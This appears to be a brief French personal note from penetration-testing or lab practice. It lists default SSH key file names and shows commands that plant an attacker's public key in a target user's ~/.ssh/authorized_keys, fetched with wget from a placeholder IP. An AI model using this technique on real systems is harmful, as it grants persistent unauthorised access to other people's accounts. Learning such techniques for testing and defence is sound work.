fichiers de clefs par défaut:
* id_rsa
* id_dsa
* id_dss
* id_ecdsa

On peut s'autoriser soit-même en créant le dossier .ssh et en y ajoutant notre clef publique

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cp /root/.ssh/id_rsa.pub authorized_keys

mkdir /home/mike/.ssh
cd/home/mike/.ssh
wget IP/authorized_keys
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
